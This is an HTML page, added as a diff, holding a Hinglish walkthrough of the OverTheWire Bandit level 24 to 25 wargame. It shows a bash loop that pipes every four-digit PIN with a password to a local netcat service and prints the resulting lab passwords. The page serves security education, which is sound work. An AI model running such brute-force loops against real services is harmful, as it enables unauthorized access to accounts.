@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OverTheWire Bandit - Level 24 to Level 25 | SSSWriteups</title>
+  <link rel="stylesheet" href="../../../style.css">
+</head>
+<body>
+  <header class="hero page-header">
+    <nav class="nav container">
+      <a class="logo" href="../../../../index.html">
+        SSS<span>Writeups</span>
+      </a>
+      <div class="nav-links">
+    <a href="../../../index.html">Home</a>
+    <a href="../../../categories/overthewire.html">OverTheWire</a>
+</div>
+    </nav>
+  </header>
+
+  <main class="writeup-page section container">
+    <article class="writeup-content">
+      <h1>OverTheWire Bandit — Level 24 to Level 25</h1>
+
+      <h2>Introduction</h2>
+      <p>Is writeup ka heading <strong>Level 24 → Level 25</strong> hai.</p>
+      <p>Is level mein ek daemon (background service) port <code>30002</code> par listen kar raha hai. Ye service aapko <code>bandit25</code> ka password degi agar aap correctly provide karein:</p>
+      <ul>
+        <li><code>bandit24</code> ka password</li>
+        <li>Ek secret 4-digit numeric pincode</li>
+      </ul>
+      <p>Pincode retrieve karne ka koi direct way nahi hai. Humein saare <code>10000</code> combinations try karne honge, jise <strong>brute-force</strong> kehte hain.</p>
+      <p>Humein ek shell script create karni hai jo:</p>
+      <ul>
+        <li><code>0000</code> se <code>9999</code> tak saare 4-digit numbers iterate kare.</li>
+        <li>Har number ke saath <code>bandit24</code> ka password combine kare.</li>
+        <li>Netcat ke through server ko send kare.</li>
+        <li>Server ka response check kare.</li>
+      </ul>
+
+      <h2>Objective</h2>
+      <p>Is level mein humein:</p>
+      <ul>
+        <li><code>bandit24</code> user se SSH login karna hai.</li>
+        <li>Port <code>30002</code> par running service ko identify karna hai.</li>
+        <li>Brute-force script create karni hai.</li>
+        <li>Script ko execute karke correct pincode find karna hai.</li>
+        <li><code>bandit25</code> ka password receive karna hai.</li>
+        <li><code>bandit25</code> user se next SSH login karna hai.</li>
+      </ul>
+
+      <h2>Given Information</h2>
+      <p>Current level:</p>
+      <pre><code class="language-text">Username: bandit24
+Password: Previous level se mila password</code></pre>
+      <p>Service:</p>
+      <pre><code class="language-text">Port: 30002
+Host: localhost</code></pre>
+      <p>Required input:</p>
+      <pre><code class="language-text">bandit24 password + 4-digit pincode (0000-9999)</code></pre>
+      <p>Next username:</p>
+      <pre><code class="language-text">bandit25</code></pre>
+      <p>Found password:</p>
+      <pre><code class="language-text">p7TaowMYrmu23018hiZh9UvD009hpx8d</code></pre>
+
+      <h1>Brute-Force Concept</h1>
+
+      <h2>Brute-Force Kya Hota Hai?</h2>
+      <p>Brute-force ek technique hai jismein saare possible combinations try kiye jate hain jab tak correct combination na mil jaye.</p>
+      <p>Is level mein:</p>
+      <ul>
+        <li>Possible PINs: <code>0000</code> se <code>9999</code></li>
+        <li>Total combinations: <code>10000</code></li>
+        <li>Har combination ko server ko send karna hai.</li>
+        <li>Server correct combination par password return karega.</li>
+      </ul>
+
+      <h2>Why 10000 Combinations?</h2>
+      <p>4-digit numeric pincode ka range:</p>
+      <pre><code class="language-text">0000, 0001, 0002, ..., 9998, 9999</code></pre>
+      <p>Total:</p>
+      <pre><code class="language-text">10000 combinations</code></pre>
+
+      <h1>Netcat (nc) Usage</h1>
+
+      <h2>Netcat Kya Hota Hai?</h2>
+      <p>Netcat ek networking utility hai jo TCP/UDP connections establish karne ke liye use hota hai.</p>
+      <p>Basic syntax:</p>
+      <pre><code class="language-bash">nc host port</code></pre>
+      <p>Is level mein:</p>
+      <pre><code class="language-bash">nc localhost 30002</code></pre>
+
+      <h2>Pipe Operator <code>|</code></h2>
+      <p>Pipe first command ke output ko second command ke input mein send karta hai.</p>
+      <p>Example:</p>
+      <pre><code class="language-bash">echo "message" | nc localhost 30002</code></pre>
+      <p>Flow:</p>
+      <pre><code class="language-text">echo output
+    ↓
+    |
+    ↓
+nc input → server ko send</code></pre>
+
+      <h1>Brute-Force Script</h1>
+
+      <h2>Correct Script Syntax</h2>
+      <p>Script create karein:</p>
+      <pre><code class="language-bash">vim /tmp/brute25.sh</code></pre>
+      <p>Correct script content:</p>
+      <pre><code class="language-bash">#!/bin/bash
+for i in $(seq -w 0 9999); do
+echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+done | nc localhost 30002</code></pre>
+
+      <h2>Script Explanation</h2>
+      <ol>
+        <li><strong>Shebang:</strong> <code>#!/bin/bash</code> → Bash interpreter use hoga.</li>
+        <li><strong>Loop:</strong> <code>for i in $(seq -w 0 9999)</code> → <code>0000</code> se <code>9999</code> tak iterate karega.</li>
+        <li><strong>seq -w:</strong> Numbers ko zero-padded format mein dega (<code>0000</code>, <code>0001</code>, etc.).</li>
+        <li><strong>Echo:</strong> <code>echo "password $i"</code> → Password aur pincode combine karega.</li>
+        <li><strong>Pipe:</strong> <code>done | nc localhost 30002</code> → Saare outputs server ko send karega.</li>
+      </ol>
+
+      <h2>Common Errors in Script</h2>
+      <p>Aapke pasted script mein errors the:</p>
+      <pre><code class="language-bash"># Incorrect (from query):
+for i in [0000..9999]  # Wrong syntax
+do
+echo "..." $i
+done nc localhost 30002  # Missing pipe</code></pre>
+      <p>Correct syntax:</p>
+      <pre><code class="language-bash">for i in $(seq -w 0 9999); do
+echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+done | nc localhost 30002</code></pre>
+
+      <h2>Alternative Script</h2>
+      <p>Agar <code>seq</code> available nahi hai, to printf use karein:</p>
+      <pre><code class="language-bash">#!/bin/bash
+for i in {0000..9999}; do
+echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+done | nc localhost 30002</code></pre>
+
+      <h1>Script Execution</h1>
+
+      <h2>Executable Permissions</h2>
+      <p>Script ko executable banayein:</p>
+      <pre><code class="language-bash">chmod +x /tmp/brute25.sh</code></pre>
+
+      <h2>Script Run Karna</h2>
+      <p>Script execute karein:</p>
+      <pre><code class="language-bash">/tmp/brute25.sh</code></pre>
+      <p>Ya:</p>
+      <pre><code class="language-bash">bash /tmp/brute25.sh</code></pre>
+
+      <h2>Expected Output</h2>
+      <p>Server correct pincode par password return karega:</p>
+      <pre><code class="language-text">Correct!
+The password of bandit25 is p7TaowMYrmu23018hiZh9UvD009hpx8d</code></pre>
+
+      <h1>Complete Walkthrough</h1>
+
+      <h2>Step 1: <code>bandit24</code> Par Login Karein</h2>
+      <pre><code class="language-bash">ssh bandit24@bandit.labs.overthewire.org -p 2220</code></pre>
+
+      <h2>Step 2: Temporary Directory Mein Jaayein</h2>
+      <pre><code class="language-bash">cd /tmp</code></pre>
+
+      <h2>Step 3: Script Create Karein</h2>
+      <pre><code class="language-bash">vim brute25.sh</code></pre>
+      <p>Content:</p>
+      <pre><code class="language-bash">#!/bin/bash
+for i in $(seq -w 0 9999); do
+echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+done | nc localhost 30002</code></pre>
+
+      <h2>Step 4: Executable Permissions Dein</h2>
+      <pre><code class="language-bash">chmod +x brute25.sh</code></pre>
+
+      <h2>Step 5: Script Execute Karein</h2>
+      <pre><code class="language-bash">./brute25.sh</code></pre>
+
+      <h2>Step 6: Output Wait Karein</h2>
+      <p>Script 10000 combinations try karega. Correct pincode milne par server password return karega.</p>
+
+      <h2>Step 7: Password Copy Karein</h2>
+      <pre><code class="language-text">p7TaowMYrmu23018hiZh9UvD009hpx8d</code></pre>
+
+      <h2>Step 8: <code>bandit25</code> Par Login Karein</h2>
+      <pre><code class="language-bash">ssh bandit25@bandit.labs.overthewire.org -p 2220</code></pre>
+      <p>Password:</p>
+      <pre><code class="language-text">p7TaowMYrmu23018hiZh9UvD009hpx8d</code></pre>
+
+      <h1>Actual Terminal Workflow</h1>
+      <pre><code class="language-text">bandit24@bandit:~$ cd /tmp
+bandit24@bandit:/tmp$ vim brute25.sh
+bandit24@bandit:/tmp$ chmod +x brute25.sh
+bandit24@bandit:/tmp$ ./brute25.sh
+# Wait for output...
+Correct!
+The password of bandit25 is p7TaowMYrmu23018hiZh9UvD009hpx8d</code></pre>
+
+      <h1>Timeout Issues</h1>
+
+      <h2>Timeout Error</h2>
+      <p>Agar aapko "Timeout Exiting" error aa raha hai, to ye possible reasons se ho sakta hai:</p>
+      <ul>
+        <li>Server connection timeout ho raha hai.</li>
+        <li>Netcat ka version different hai.</li>
+        <li>Server har request ke baad connection close kar raha hai.</li>
+      </ul>
+
+      <h2>Solution: Single Connection</h2>
+      <p>Challenge note kehta hai: "You do not need to create new connections each time"</p>
+      <p>Iska matlab saare inputs ek hi connection mein send karne chahiye (jo pipe operator automatically karta hai).</p>
+
+      <h2>Alternative Approach</h2>
+      <p>Agar script timeout ho rahi hai, to manually test karein:</p>
+      <pre><code class="language-bash">echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234" | nc localhost 30002</code></pre>
+      <p>Server response check karein.</p>
+
+      <h1>Common Errors</h1>
+
+      <h2>Wrong Loop Syntax</h2>
+      <p>Incorrect:</p>
+      <pre><code class="language-bash">for i in [0000..9999]  # Wrong</code></pre>
+      <p>Correct:</p>
+      <pre><code class="language-bash">for i in $(seq -w 0 9999)
+# or
+for i in {0000..9999}</code></pre>
+
+      <h2>Missing Pipe</h2>
+      <p>Incorrect:</p>
+      <pre><code class="language-bash">done nc localhost 30002  # Missing pipe</code></pre>
+      <p>Correct:</p>
+      <pre><code class="language-bash">done | nc localhost 30002</code></pre>
+
+      <h2>Wrong Password</h2>
+      <p>Script mein <code>bandit24</code> ka correct password use karein. Agar password wrong hai, to saare combinations fail honge.</p>
+
+      <h2>Script Not Executable</h2>
+      <p>Permissions check karein:</p>
+      <pre><code class="language-bash">chmod +x brute25.sh</code></pre>
+
+      <h2>Timeout Error</h2>
+      <p>Agar timeout aa raha hai:</p>
+      <ul>
+        <li>Script syntax verify karein.</li>
+        <li>Netcat available hai check karein: <code>which nc</code></li>
+        <li>Server running hai check karein: <code>netstat -tlnp | grep 30002</code></li>
+        <li>Script ko <code>/tmp</code> mein hi rakhein.</li>
+      </ul>
+
+      <h2>Password Copy Error</h2>
+      <p>Password:</p>
+      <pre><code class="language-text">p7TaowMYrmu23018hiZh9UvD009hpx8d</code></pre>
+      <p>Check karein:</p>
+      <ul>
+        <li>Uppercase aur lowercase characters same hain.</li>
+        <li><code>0</code> aur <code>O</code> ko carefully distinguish karein.</li>
+        <li>Password ke start ya end mein extra space nahi hai.</li>
+      </ul>
+
+      <h2>SSH Permission Denied</h2>
+      <p>Next level par login karte waqt check karein:</p>
+      <ul>
+        <li>Username <code>bandit25</code> hai.</li>
+        <li>Port <code>2220</code> use ho raha hai.</li>
+        <li>Server se mila exact password copy hua hai.</li>
+      </ul>
+      <pre><code class="language-bash">ssh bandit25@bandit.labs.overthewire.org -p 2220</code></pre>
+
+      <h1>Security Lessons</h1>
+      <p>Is level se humein ye important lessons milte hain:</p>
+      <ul>
+        <li>Brute-force attacks weak authentication ko bypass kar sakte hain.</li>
+        <li>4-digit PINs easily brute-force ho sakte hain.</li>
+        <li>Shell scripts automation ke liye powerful hain.</li>
+        <li>Netcat network communication ke liye useful hai.</li>
+        <li>Pipe operator commands ko chain karne mein help karta hai.</li>
+        <li>Rate limiting brute-force attacks ko slow kar sakti hai.</li>
+        <li>Strong authentication mechanisms brute-force resistant hone chahiye.</li>
+        <li>Timeout errors debugging mein common hain.</li>
+        <li>Single connection reuse efficiency improve karta hai.</li>
+      </ul>
+
+      <h1>Commands Summary</h1>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Command</th>
+              <th>Purpose</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>ssh user@host -p 2220</code></td>
+              <td>Remote server par SSH login karta hai</td>
+            </tr>
+            <tr>
+              <td><code>cd /tmp</code></td>
+              <td>Temporary directory mein enter karta hai</td>
+            </tr>
+            <tr>
+              <td><code>vim brute25.sh</code></td>
+              <td>Brute-force script create/edit karta hai</td>
+            </tr>
+            <tr>
+              <td><code>chmod +x script.sh</code></td>
+              <td>Script ko executable banata hai</td>
+            </tr>
+            <tr>
+              <td><code>./brute25.sh</code></td>
+              <td>Brute-force script execute karta hai</td>
+            </tr>
+            <tr>
+              <td><code>echo "password PIN" | nc localhost 30002</code></td>
+              <td>Single combination test karta hai</td>
+            </tr>
+            <tr>
+              <td><code>seq -w 0 9999</code></td>
+              <td>Zero-padded numbers generate karta hai</td>
+            </tr>
+            <tr>
+              <td><code>exit</code></td>
+              <td>SSH session close karta hai</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h1>Final Solution</h1>
+      <p><code>bandit24</code> par login karein:</p>
+      <pre><code class="language-bash">ssh bandit24@bandit.labs.overthewire.org -p 2220</code></pre>
+      <p>Temporary directory mein jaayein:</p>
+      <pre><code class="language-bash">cd /tmp</code></pre>
+      <p>Brute-force script create karein:</p>
+      <pre><code class="language-bash">vim brute25.sh</code></pre>
+      <p>Content:</p>
+      <pre><code class="language-bash">#!/bin/bash
+for i in $(seq -w 0 9999); do
+echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+done | nc localhost 30002</code></pre>
+      <p>Executable permissions dein:</p>
+      <pre><code class="language-bash">chmod +x brute25.sh</code></pre>
+      <p>Script execute karein:</p>
+      <pre><code class="language-bash">./brute25.sh</code></pre>
+      <p>Server se password receive hoga:</p>
+      <pre><code class="language-text">p7TaowMYrmu23018hiZh9UvD009hpx8d</code></pre>
+      <p>Ab <code>bandit25</code> par login karein:</p>
+      <pre><code class="language-bash">ssh bandit25@bandit.labs.overthewire.org -p 2220</code></pre>
+
+      <h1>Conclusion</h1>
+      <p>Bandit Level 24 → Level 25 mein humne brute-force technique use karke 4-digit PIN find kiya aur <code>bandit25</code> ka password obtain kiya.</p>
+      <p>Complete workflow:</p>
+      <pre><code class="language-text">SSH Login as bandit24
+        ↓
+/tmp Directory Navigate
+        ↓
+Brute-Force Script Create
+        ↓
+Loop 0000-9999
+        ↓
+Each Combination Send via nc
+        ↓
+Server Validates PIN
+        ↓
+Correct PIN par Password Return
+        ↓
+SSH Login as bandit25</code></pre>
+      <p>Is level ke most important commands hain:</p>
+      <pre><code class="language-bash">for i in $(seq -w 0 9999); do
+echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+done | nc localhost 30002</code></pre>
+      <blockquote>
+        <p><strong>Security Note:</strong> Brute-force attacks sirf authorized learning environments mein practice karein. OverTheWire Bandit ek authorized cybersecurity learning environment hai.</p>
+      </blockquote>
+    </article>
+  </main>
+
+  <footer>
+    <div class="container footer-inner">
+      <span> © 2026 SSSWriteups </span>
+      
+    </div>
+  </footer>
+</body>
+</html>
+```
